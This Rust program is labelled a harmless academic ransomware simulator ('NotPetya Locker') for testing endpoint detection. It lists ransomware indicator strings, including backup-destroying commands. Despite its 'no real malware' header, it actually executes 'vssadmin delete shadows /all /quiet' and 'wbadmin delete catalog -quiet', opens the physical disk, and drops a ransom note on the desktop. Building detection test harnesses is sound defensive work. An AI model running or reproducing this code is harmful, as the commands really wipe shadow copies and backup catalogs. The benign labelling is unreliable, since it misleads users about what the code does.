//! Benign Threat Simulator: NotPetya Locker
//! Academic EDR Telemetry Validation
//! DOES NOT CONTAIN REAL MALWARE OR ENCRYPTION.

use std::env;
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;

fn main() {
    // FAKE IOCs FOR STATIC ANALYSIS DETECTION
    #[allow(dead_code)]
    let static_iocs = [
        "WanaCrypt0r",
        "LockBit",
        "DarkSide",
        "REvil",
        "vssadmin.exe delete shadows /all /quiet",
        "wbadmin DELETE SYSTEMSTATEBACKUP",
        "bcdedit /set {default} recoveryenabled No",
        "taskkill /f /im",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "crypto_keys_encrypted.rsa",
    ];
    std::hint::black_box(static_iocs);

    println!("==================================================");
    println!(" ACADEMIC SIMULATOR: NotPetya Locker-Ransomware");
    println!("==================================================");

    // 1. Execute vssadmin
    println!("[*] Executing vssadmin delete shadows /all /quiet...");
    let _ = Command::new("cmd")
        .args(&["/C", "vssadmin", "delete", "shadows", "/all", "/quiet"])
        .output();

    // 2. Execute wbadmin
    println!("[*] Executing wbadmin delete catalog -quiet...");
    let _ = Command::new("cmd")
        .args(&["/C", "wbadmin", "delete", "catalog", "-quiet"])
        .output();

    // 3. Attempt a dummy write to \Device\HarddiskVolume1 (MBR Ring 0 protection)
    println!("[*] Attempting dummy write to physical disk \\\\.\\PhysicalDrive0...");
    match File::open("\\\\.\\PhysicalDrive0") {
        Ok(_) => println!("[-] Successfully opened PhysicalDrive0 for reading (Expected read access)."),
        Err(e) => println!("[-] Failed to open PhysicalDrive0: {}", e),
    }

    // 4. Drop Ransom Note
    let user_profile = env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    let mut desktop = PathBuf::from(user_profile);
    desktop.push("Desktop");
    let note_path = desktop.join("README_LOCKED.txt");
    
    println!("[*] Dropping Ransom Note to: {:?}", note_path);
    if let Ok(mut file) = File::create(&note_path) {
        let _ = file.write_all(b"This is a simulated ransomware note for academic EDR testing.\nYour files have NOT been encrypted.");
    }
    
    println!("[+] NotPetya Locker simulation complete.");
}